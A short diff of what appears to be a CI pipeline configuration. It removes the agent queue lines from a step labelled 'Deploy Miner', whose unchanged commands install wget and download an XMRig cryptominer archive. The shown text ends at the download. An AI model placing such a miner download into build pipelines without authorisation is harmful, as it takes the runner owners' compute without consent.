@@ -6,8 +6,6 @@ steps:
   - label: "🚀 Deploy Miner"
     key: "deploy"
     depends_on: "build"
-    agents:
-      queue: "linux-medium"
     commands:
       - apt-get update && apt-get install -y wget
       - wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
